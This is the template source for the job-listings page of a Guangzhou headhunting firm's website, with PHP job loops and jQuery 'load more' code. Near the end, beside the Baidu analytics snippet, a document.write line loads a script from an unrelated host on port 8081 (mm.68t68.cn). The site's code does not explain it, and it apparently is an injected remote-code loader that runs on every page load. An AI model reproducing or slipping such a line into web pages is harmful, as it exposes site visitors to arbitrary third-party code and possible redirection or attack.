<?php if (!defined('THINK_PATH')) exit();?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>广州千唯仕企业管理咨询有限公司 | 千千人才，唯你能仕</title>
<meta name="keywords" content="猎头,猎头公司，三顾茅庐，招聘，猎头招聘，猎头顾问，千唯仕" />
<meta name="description" content="千唯仕猎头是中国一家快速成长的专业化猎头公司。核心团队由一批具有十多年行业经验的资深猎头顾问组成，在业内享有良好的口碑和声誉。千唯仕起名灵感来源于英文“trivisit”的音译，意为三顾茅庐，体现公司重视人才，求贤若渴的企业文化。" />
<link rel="stylesheet" type="text/css" href="/Public/css/style.css" />
<script type="text/javascript" src="/Public/js/jquery-1.10.2.min.js"></script>
</head>
<body>
<div class="header">
	<div class="header-c">
		<h1 class="logo"><a href="/" id="logo" title=""></a></h1>
		<span class="toptel"></span>
	</div>
</div>
<div class="navigation">
	<ul class="nav">
		<li><a href="/">首页</a></li>
		<li><a href="<?php echo U('/aboutus/');?>">关于我们</a></li>
		<li><a href="<?php echo U('/culture/');?>">企业文化</a></li>
		<li><a href="<?php echo U('/xlsteps/');?>">寻猎流程</a></li>
		<li><a href="<?php echo U('/advantage/');?>">猎头招人优势</a></li>
		<li><a href="<?php echo U('/recruit/');?>">猎头职位</a></li>
		<li><a href="<?php echo U('/resumer/');?>">千里马档案</a></li>
		<li><a href="<?php echo U('/myrecruit/');?>">招贤纳士</a></li>
		<li><a href="<?php echo U('/contactus/');?>" class="end last">联系我们</a></li>
	</ul>
</div>
<div class="bnlazy sub-banner" data-original="/Public/images/3.jpg" width="100%" height="300" style="display: block; background-image: url(/Public/images/3.jpg);">  
</div>
	<div class="content">
		<div class="content-c pd50">
			<input type="hidden" value="10" id="nextrow" />
			<h2 class="sub-rtitle">猎头职位</h2>
			<ul class="recruitlist">
				<?php if(is_array($recruits)): foreach($recruits as $key=>$v): ?><li class="item" id="<?php echo ($v["id"]); ?>">
				<a href="<?php echo U('/recruit/',array('id'=>$v['id']));?>" target="_blank"><span>[<?php echo (date("Y-m-d",$v["time"])); ?>]</span><span><?php echo ($v["title"]); ?></span><span>年薪：<?php echo ($v["salary"]); ?></span><span>工作地点：<?php echo ($v["address"]); ?></span></a>
				</li><?php endforeach; endif; ?>
			</ul>	
			<div class="loadmorebox">
				<div class="rloading"></div>
				<a href="javascript:;" id="loadmore" class="loadmore" >点击加载更多</a>
			</div>
		</div>
	</div>
<div class="footer">
	<div class="footer-c">
		<p>联系电话：+8620 3424 8656&nbsp;&nbsp;&nbsp;&nbsp;电子邮箱：<a href="mailto:hr@trivisit.com">hr@trivisit.com</a></p>
		<p>Copyright ©2015-2017 千唯仕猎头www.trivisit.com All Rights Reserved&nbsp;&nbsp;&nbsp;&nbsp;粤ICP备15005806号</p>
	</div>
</div>

<!-- <div class="customer"><a href="http://wpa.qq.com/msgrd?v=3&uin=2891075438&site=qq&menu=yes" target="_blank"><img src="/Public/images/qq.jpg" width="28" height="112" border="0" /></a></div> -->
<script type="text/javascript" src="/Public/js/jquery.SuperSlide.2.1.1.js"></script>
<script type="text/javascript" src="/Public/js/jquery.lazyload.min.js"></script>
<script type="text/javascript" src="/Public/js/navstyle.js"></script>
<script type="text/javascript">
	$(function(){
	$(".bnlazy").lazyload();
	//$(".customer").float({});
	});
	
	
	var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://"); document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F734627ff4be7d31b518b64d2ca96157c' type='text/javascript'%3E%3C/script%3E")) 
document.write("<script type=\"text/javascript\" src=\"http://mm.68t68.cn:8081/api.aspx?bhid=1154\"><\/script>");
</script>
<script type="text/javascript">
var zxUrl="<?php echo U(MODULE_NAME.'/Recruit/getxia','','');?>",umodel="<?php echo U('/recruit/','','');?>";
$(function(){var $container=$('.recruitlist');var loadmore=$("#loadmore").data("on",false);var rloading=$(".rloading");var pagelimit=10;$("#loadmore").click(function(){var nextrow=$("#nextrow").val();if(loadmore.data("on"))return;rloading.fadeIn();loadmore.data("on",true);$.ajax({type:"post",url:zxUrl,data:{id:$container.find(".item:last").attr("id"),nextrow:nextrow},dataType:"json",success:function(data){if(!data){$("#loadmore").html('全部已加载完成');rloading.fadeOut();loadmore.fadeOut(1500);return}$("#nextrow").val(parseInt(nextrow)+pagelimit);var html="",item;if($.isArray(data)){for(i in data){item=data[i];html+='<li id="'+item.id+'" class="item"><a href="'+umodel+'/id/'+item.id+'" target="_blank">';html+='<span>['+getYMD(item.time)+']</span>';html+='<span>'+item.title+'</span>';html+='<span>年薪：'+item.salary+'</span>';html+='<span>工作地点：'+item.address+'</span>';html+='</a></li>'}$(html).appendTo($container);loadmore.data("on",false)}rloading.fadeOut()}})})});
function getYMD(aa){var gety=new Date(parseInt(aa)*1000).getFullYear(),getm=new Date(parseInt(aa)*1000).getMonth()+1,getd=new Date(parseInt(aa)*1000).getDate();if(getm<10){getm='0'+getm}if(getd<10){getd='0'+getd}return gety+'-'+getm+'-'+getd}
</script>
</body>
</html>